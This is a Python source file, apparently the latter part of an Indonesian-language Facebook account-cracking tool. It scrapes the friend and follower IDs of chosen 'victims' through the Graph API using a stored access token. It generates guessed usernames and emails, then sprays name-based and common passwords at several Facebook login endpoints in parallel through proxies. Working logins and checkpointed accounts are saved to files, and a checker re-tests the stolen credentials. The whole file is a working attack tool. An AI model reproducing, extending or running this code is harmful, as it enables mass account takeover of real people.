    if kamu_nanya in ['1', '01']:
        dump_massal()
    elif kamu_nanya in ['2', '02']:
        pengikut()
    elif kamu_nanya in ['3', '03']:
        result()
    elif kamu_nanya in ['4', '04']:
        crack_email()
    elif kamu_nanya in ['0', 'out']:
        for f_ in ('akmd.txt', 'akmdx.txt'):
            if os.path.exists(f_):
                os.remove(f_)
        print(f'{zam} {m}Sukses Logout{x}')
        time.sleep(3)
        login_lagi334()
    else:
        _warn('Pilih Yang Bener Asu')
        time.sleep(2)
        back()

def error():
    _warn('Maaf Fitur Ini Masih Di Perbaiki')
    time.sleep(3)
    back()

#------------------[ DUMP PENGIKUT ]----------------#
def pengikut():
    try:
        token = open('akmd.txt').read()
        cok = open('akmdx.txt').read()
    except OSError:
        exit()
    s = _new_session()
    _apply_cookie(s, cok)
    _info(f'Ketik ({H}me{P}) jika ingin crack follower sendiri')
    pi = input(f'{zam} Masukkan Idz Target : ')
    try:
        koh2 = s.get(f'https://graph.facebook.com/{pi}?fields=subscribers.limit(5000)&access_token={token}', timeout=20).json()
        for pi in koh2.get('subscribers', {}).get('data', []):
            try:
                id.append(pi['id'] + '|' + pi['name'])
                sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz...")
                sys.stdout.flush()
                time.sleep(0.0002)
            except Exception:
                continue
        print("\r")
        _ok(f'Total Idz : {len(id)}')
        setting()
    except requests.exceptions.ConnectionError:
        _err('Koneksi Bermasalah Masbro')
        time.sleep(3)
        exit()
    except (KeyError, OSError):
        _err('Gagal Dump Tod')
        time.sleep(3)
        exit()

#------------------[ MENU LAINNYA ]----------------#
def lainnya():
    logo()
    print(f"{zam1} Cloning Name \n{zam2} Cloning Email \n{zam0} Kembali")
    bray = input(f'{plhh}')
    if bray in ['1', '01']:
        crack_nama()
    elif bray in ['2', '02']:
        crack_email()
    elif bray in ['0', '00', '']:
        back()
    else:
        _warn('Pilih Yang Bener Asu')
        time.sleep(2)
        back()

#------------------[ CRACK USERNAME ]----------------#
def crack_nama():
    nama = []
    custom = [" rehan"," suka"," siska"," alwy"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
    custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","amat ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
    _info('Crack username, pisahkan dengan koma')
    nam = input(f'{zam} Nama : {H}').split(",")
    for ser in nam:
        ser = ser.strip()
        if not ser:
            continue
        for belakang in custom:
            nama.append(ser + belakang)
        for depan in custom2:
            nama.append(depan + ser)
    if not nama:
        _warn('Nama kosong')
        return back()
    _info(f'Total query : {len(nama)}')
    with tred(max_workers=WORKER[0]) as thread:
        for ids in nama:
            thread.submit(cari_nama, f"https://mbasic.facebook.com/public/{ids}?/locale2=id_ID")
    setting()

def cari_nama(link):
    try:
        r = _req(_new_session(), 'get', link, timeout=15)
        soup = parser(r.text, 'html.parser')
        for xx in soup.find_all('td'):
            for uid, n in re.findall(r'<a href="/(.*?)\"><div class=".*?"><div class=".*?">(.*?)</div>', str(xx)):
                if 'profile.php?' in uid:
                    uid = re.findall(r'id=(.*)', uid)[0]
                elif '<span' in n:
                    n = re.findall(r'(.*?)<', n)[0]
                bo = uid + '|' + n
                if bo not in id:
                    id.append(bo)
                    sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz ...")
                    sys.stdout.flush()
        link_next = soup.find('a', string='Lihat Hasil Selanjutnya')
        if link_next and link_next.get('href'):
            time.sleep(0.1)
            cari_nama(link_next)
    except Exception:
        pass

#------------------[ CRACK EMAIL ]----------------#
def crack_email():
    rc = random.choice
    rr = random.randint
    xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
    blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
    _info('Masukan Nama Email, Contoh : Satria Batang Hitam')
    nama = input(f'{zam} Nama : {H}').strip()
    if not nama:
        _warn('Nama jangan kosong')
        time.sleep(2)
        return back()
    print(f'{zam} Masukan Domain, Contoh : {H}@gmail.com, @yahoo.com')
    doma = input(f'{zam} Domain :{H} ').strip()
    if '@' not in doma or '.' not in doma:
        _warn('Domain salah')
        time.sleep(2)
        return back()
    jumlah = input(f'{zam} Total Id (max 5000) : {H}').strip()
    try:
        jumlah = int(jumlah)
    except Exception:
        _warn('Total harus angka')
        time.sleep(2)
        return back()
    for xyz in range(min(jumlah, 5000)):
        A = nama
        B = rc([rc(xc), str(rr(0, 31)), rc(blk), f'{rc(xc)}{rr(0,31)}', str(xyz)])
        D = f'{A}{B}{doma}'
        if D not in id:
            id.append(D + '|' + nama)
        sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz...")
        sys.stdout.flush()
    print("\r")
    _ok(f'Total : {len(id)}')
    setting()

#------------------[ HASIL ]----------------#
def result():
    logo()
    print(f'\n{zam1} Hasil OK ')
    print(f'{zam2} Hasil CP ')
    print(f'{zam3} Cek Opsi CP ')
    print(f'{zam0} Kembali\t')
    kz = input(f'{plhh}')
    if kz in ['2', '02']:
        view_results('CP')
    elif kz in ['1', '01']:
        view_results('OK')
    elif kz in ['3', '03']:
        cek_opsi()
    else:
        back()

def view_results(folder):
    try:
        files = sorted(os.listdir(folder))
        if not files:
            _warn('Result Tidak Di Temukan')
            time.sleep(2)
            return back()
        tbl = Table(box=None, show_header=True, header_style='#00C8FF')
        tbl.add_column('#', style='#00FF00', width=4)
        tbl.add_column('File', style='#FFFFFF')
        tbl.add_column('Total', justify='right', style='#FFFF00')
        for idx, fname in enumerate(files, 1):
            with open(f'{folder}/{fname}') as f:
                tbl.add_row(str(idx), fname, str(len(f.readlines())))
        console.print(panel(tbl, border_style='#00C8FF', title=f'[#00C8FF]{folder}[/]', padding=(0, 2)))
        choice = input(f'{zam} Pilih nomor : ')
        try:
            chosen = files[int(choice) - 1]
        except Exception:
            _warn('Pilihan salah')
            return back()
        isi = open(f'{folder}/{chosen}').read().splitlines()
        _ok(f'{len(isi)} baris dari {chosen}')
        for line in isi:
            parts = line.split('|')
            if len(parts) >= 2:
                print(f'{zam} {parts[0]} | {parts[1]}')
        input(f'\n{zam} Press Enter')
        back()
    except Exception:
        _warn(f'Folder {folder} tidak ditemukan')
        back()

def zamua():
    uatambah = input(f'{zam} Pakai Useragent Manual (y/t) : {H}')
    if uatambah.lower() in ['y', 'ya']:
        ualuh.append('ya')
        bzer = input(f'{zam} Your UserAgent : ').strip()
        if bzer:
            ugen.append(bzer)
    else:
        ualuh.append('tidak')

#------------------[ CRACK PUBLIK ]----------------#
def dump_massal():
    global id
    id = []
    try:
        token = open('akmd.txt').read()
        jum = int(input(f'\n{zam} Berapa ID Target? :{H} '))
    except Exception:
        _warn('Input yang benar')
        return back()
    if jum < 1 or jum > 80:
        _warn('Minimal 1, maksimal 80 ID')
        return back()
    s = _new_session()
    uid_list = [input(f'{zam} Korban Ke {i+1}: ').strip() for i in range(jum)]
    for user_id in uid_list:
        try:
            url = f'https://graph.facebook.com/v18.0/{user_id}/friends?limit=5000&access_token={token}'
            col = s.get(url, timeout=20).json()
            for friend in col.get('friends', {}).get('data', []):
                entry = friend['id'] + '|' + friend.get('name', 'Unknown')
                if entry not in id:
                    id.append(entry)
            sys.stdout.write(f"\r{zam} Mengumpulkan {len(id)} Idz...")
            sys.stdout.flush()
        except Exception:
            continue
    print(f'\n{zam} Calon Korban : {len(id)}')
    if len(id) > 0:
        setting()
    else:
        _warn('Pertemanan Privat')
        time.sleep(3)
        back()

#------------------[ PENGATURAN ]---------------#
def setting():
    global id2
    id2 = []
    print(f'\n{zam1} Crack New-Old ')
    print(f'{zam2} Crack Old-New ')
    print(f'{zam3} Crack Random ')
    hu = input(f'{zam} Pilih :{H} ')
    if hu in ['1', '01']:
        id2 = sorted(id, reverse=True)
    elif hu in ['2', '02']:
        id2 = sorted(id)
    elif hu in ['3', '03']:
        id2 = random.sample(id, len(id)) if id else []
    else:
        _warn('Pilih Yang Bener Asu')
        return back()
    print(f'\n{zam} {H}V{P} For Validate ,{H} R{P} For Regular')
    print(f'\n{zam1} Mobile [ {H}1v{P}/{H}1r{P} ]     {zam4} B-Api')
    print(f'{zam2} Mbasic [ {H}2v{P}/{H}2r{P} ]     {zam5} Async')
    print(f'{zam3} Free   [ {H}3v{P}/{H}3r{P} ]     {zam6} Beta')
    hc = input(f'{plhh}')
    method.clear()
    peta = {'1v': 'validate1', '01': 'validate1', '2v': 'validate2', '02': 'validate2',
            '3v': 'validate3', '03': 'validate3', '1r': 'reguler1', '08': 'reguler1',
            '2r': 'reguler2', '07': 'reguler2', '3r': 'reguler3', '3R': 'reguler3',
            '4': 'bapi', '04': 'bapi', '5': 'async_method', '05': 'async_method',
            '6': 'crackbeta'}
    method.append(peta.get(hc, 'validate1'))

    pwplus = input(f'\n{zam} Tambahkan Password Manual (y/t) :{H} ')
    if pwplus.lower() in ['y', 'ya']:
        pwpluss.append('ya')
        pwku = input(f'{zam} Password (pisah koma) : ')
        pwnya.extend([p_.strip() for p_ in pwku.split(',') if len(p_.strip()) >= 6])
    else:
        pwpluss.append('no')

    zamua()

    _zamu_ = input(f'{zam} Tampilkan Aplikasi Terkait (y/t) : {H}')
    taplikasi.append('ya' if _zamu_.lower() in ['y', 'ya'] else 'no')

    px = input(f'{zam} Pakai Proxy (y/t) : {H}')
    USE_PROXY[0] = 'ya' if px.lower() in ['y', 'ya'] else 'tidak'

    wk = input(f'{zam} Worker (Enter = 30) : {H}').strip()
    try:
        WORKER[0] = max(1, min(int(wk), 100)) if wk else 30
    except Exception:
        WORKER[0] = 30

    dl = input(f'{zam} Delay per akun detik (Enter = 0) : {H}').strip()
    try:
        DELAY[0] = max(0.0, float(dl)) if dl else 0.0
    except Exception:
        DELAY[0] = 0.0

    passwrd()

#------------------[ WORDLIST ]------------#
def passwrd():
    print(f'\n{zam} Hasil OK : OK/{okc}')
    print(f'{zam} Hasil CP : CP/{cpc}')
    print(f'{zam} Worker : {WORKER[0]} | Proxy : {USE_PROXY[0]} | Delay : {DELAY[0]}s')
    _info('Mainkan mode pesawat tiap 500 ID\n')
    with tred(max_workers=WORKER[0]) as pool:
        for yuzong in id2:
            parts = yuzong.split('|')
            if len(parts) < 2:
                continue
            idf, nmf = parts[0], parts[1].lower()
            frs = nmf.split(' ')[0] if nmf else ''
            pwv = []
            if len(frs) >= 3:
                pwv.extend([frs + '123', frs + '1234', frs + '12345', frs + '01', frs + '2024', frs + '2025'])
            pwv.extend(['123456', '12345678', 'password', 'qwerty', '12345', '123456789'])
            if 'ya' in pwpluss:
                pwv.extend(pwnya)
            fn = {'validate1': validate1, 'validate2': validate2, 'validate3': validate3,
                  'reguler1': reguler1, 'reguler2': reguler2, 'reguler3': reguler3,
                  'bapi': bapi, 'async_method': async_method, 'crackbeta': crackbeta}.get(method[0], validate1)
            pool.submit(fn, idf, pwv)
    print(f'\n{zam} Crack Selesai Masbro')
    print(f'{zam} Hasil OK : {ok}')
    print(f'{zam} Hasil CP : {cp}')
    time.sleep(2)
    back()

def zamth(fx):
    if not fx or len(fx) < 5:
        return ''
    year_map = {5:'2006',6:'2006',7:'2007',8:'2008',9:'2009'}
    if len(fx) <= 9:
        return year_map.get(len(fx), '')
    prefix = fx[:7]
    tabel = {'1000006':'2010','1000007':'2010','1000008':'2010','1000009':'2010',
             '1000010':'2011','1000011':'2011','1000012':'2012','1000013':'2012',
             '1000014':'2013','1000015':'2013','1000016':'2014','1000017':'2014',
             '1000018':'2015','1000019':'2015'}
    if prefix in tabel:
        return tabel[prefix]
    pendek = {'10001':'2016','10002':'2017','10003':'2018','10004':'2019',
              '10005':'2020','10006':'2021','10007':'2022','10008':'2022','10009':'2023'}
    return pendek.get(fx[:5], '')

#--------------------[ METODE CRACK ]--------------------#
def _cek(sess, r, idf, pw, ua):
    jar = sess.cookies.get_dict()
    if 'c_user' in jar:
        _save_ok(idf, pw, ua)
        return 'ok'
    if 'checkpoint' in jar or 'checkpoint' in str(r.url):
        _save_cp(idf, pw)
        return 'cp'
    if 'two_step_verification' in str(r.url) or 'two_step' in r.text:
        _save_cp(idf, pw)
        return 'cp'
    return None

def _jalan(idf, pwv, mode):
    global loop, ok, cp
    ua = _ua_pick()
    for pw in pwv:
        sess = _new_session()
        sess.headers['user-agent'] = ua
        try:
            hasil = mode(sess, idf, pw, ua)
            if hasil == 'ok':
                ok += 1
                sys.stdout.write(f"\r{zam} OK:{ok} CP:{cp} | {idf}          ")
                sys.stdout.flush()
                break
            if hasil == 'cp':
                cp += 1
                sys.stdout.write(f"\r{zam} OK:{ok} CP:{cp} | {idf}          ")
                sys.stdout.flush()
                break
        except requests.exceptions.ProxyError:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except Exception:
            continue
        finally:
            if DELAY[0]:
                time.sleep(DELAY[0])
    loop += 1

def _m_device(sess, idf, pw, ua):
    p = _req(sess, 'get', f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin', timeout=20)
    lsd = _grab(r'name="lsd" value="(.*?)"', p.text)
    jz = _grab(r'name="jazoest" value="(\d+)"', p.text)
    if not lsd or not jz:
        return None
    data = {'lsd': lsd, 'jazoest': jz, 'uid': idf, 'pass': pw, 'flow': 'login_no_pin'}
    r = _req(sess, 'post', 'https://m.facebook.com/login/device-based/validate-password/', data=data, timeout=20)
    return _cek(sess, r, idf, pw, ua)

def _m_mbasic(sess, idf, pw, ua):
    r = _req(sess, 'post', 'https://mbasic.facebook.com/login.php',
             data={'email': idf, 'pass': pw, 'login': 'Masuk'}, timeout=20)
    return _cek(sess, r, idf, pw, ua)

def _m_free(sess, idf, pw, ua):
    r = _req(sess, 'post', 'https://free.facebook.com/login.php',
             data={'email': idf, 'pass': pw, 'login': 'Masuk'}, timeout=20)
    return _cek(sess, r, idf, pw, ua)

def _m_reguler(sess, idf, pw, ua):
    r = _req(sess, 'post', 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1',
             data={'email': idf, 'pass': pw}, timeout=20)
    return _cek(sess, r, idf, pw, ua)

def _m_mobile(sess, idf, pw, ua):
    r = _req(sess, 'post', 'https://m.facebook.com/login.php',
             data={'email': idf, 'pass': pw}, timeout=20)
    return _cek(sess, r, idf, pw, ua)

def _m_async(sess, idf, pw, ua):
    sess.headers.update({'x-requested-with': 'XMLHttpRequest',
                         'content-type': 'application/x-www-form-urlencoded'})
    r = _req(sess, 'post', 'https://www.facebook.com/login/device-based/async/login/?login_attempt=1',
             data={'email': idf, 'pass': pw}, timeout=20)
    return _cek(sess, r, idf, pw, ua)

def _m_bapi(sess, idf, pw, ua):
    data = {'adid': str(uuid.uuid4()),
            'email': idf,
            'password': pw,
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'locale': 'id_ID',
            'access_token': BAPI_APP + '|' + APP_SECRET}
    r = _req(sess, 'post', 'https://b-api.facebook.com/method/auth.login', data=data, timeout=25)
    try:
        js = r.json()
    except Exception:
        return None
    if 'session_key' in js or 'access_token' in js:
        _save_ok(idf, pw, ua)
        return 'ok'
    err = js.get('error', {})
    kode = str(err.get('code', '')) + str(err.get('error_subcode', ''))
    if any(k in kode for k in ['1348167', '1348131', '1348096', '405', '1']):
        _save_cp(idf, pw)
        return 'cp'
    return None

def validate1(idf, pwv):  _jalan(idf, pwv, _m_device)
def validate2(idf, pwv):  _jalan(idf, pwv, _m_mbasic)
def validate3(idf, pwv):  _jalan(idf, pwv, _m_free)
def reguler1(idf, pwv):   _jalan(idf, pwv, _m_reguler)
def reguler2(idf, pwv):   _jalan(idf, pwv, _m_mobile)
def reguler3(idf, pwv):   _jalan(idf, pwv, _m_reguler)
def async_method(idf, pwv): _jalan(idf, pwv, _m_async)

def bapi(idf, pwv):
    _jalan(idf, pwv, _m_bapi)

def crackbeta(idf, pwv):
    for mode in (_m_bapi, _m_device, _m_mbasic):
        _jalan(idf, pwv, mode)

#-----------------[ CEK OPSI ]-----------------#
def cek_opsi():
    if not os.path.exists('CP'):
        _warn('Folder CP tidak ditemukan')
        return back()
    files = sorted(os.listdir('CP'))
    if not files:
        _warn('Tidak ada file CP')
        return back()
    for idx, f in enumerate(files, 1):
        print(f'{zam} {idx}. {f}')
    choice = input(f'\n{zam} Pilih nomor file : ')
    try:
        filename = files[int(choice) - 1]
    except Exception:
        _warn('Pilihan salah')
        return back()
    lines = open(f'CP/{filename}').read().splitlines()
    _info(f'Cek {len(lines)} akun, worker {WORKER[0]}')
    with tred(max_workers=WORKER[0]) as pool:
        for line in lines:
            parts = line.split('|')
            if len(parts) >= 2:
                pool.submit(check_account, parts[0], parts[1])
    input(f'\n{zam} Selesai. Press Enter')
    back()

def check_account(email, password):
    try:
        sess = _new_session()
        r = _req(sess, 'post', 'https://mbasic.facebook.com/login.php',
                 data={'email': email, 'pass': password, 'login': 'Masuk'}, timeout=20)
        jar = sess.cookies.get_dict()
        if 'c_user' in jar:
            print(f'{zam}{H} LIVE: {email}|{password}')
            open('OK/OK-checked.txt', 'a').write(f'{email}|{password}\n')
        elif 'checkpoint' in jar:
            print(f'{zam}{K} CHECKPOINT: {email}|{password}')
        else:
            print(f'{zam}{M} DIE: {email}|{password}')
    except Exception:
        print(f'{zam}{M} ERROR: {email}|{password}')

#-----------------------[ SYSTEM ]--------------------#
if __name__ == '__main__':
    try:
        os.system('git pull 2>/dev/null')
    except Exception:
        pass
    for folder in ['CP', 'OK', 'data']:
        try:
            os.mkdir(folder)
        except Exception:
            pass
    try:
        os.system('touch .prox.txt 2>/dev/null')
    except Exception:
        pass
    try:
        login()
    except KeyboardInterrupt:
        print('\n\033[0;33m[!] Dihentikan\033[0m')
        sys.exit()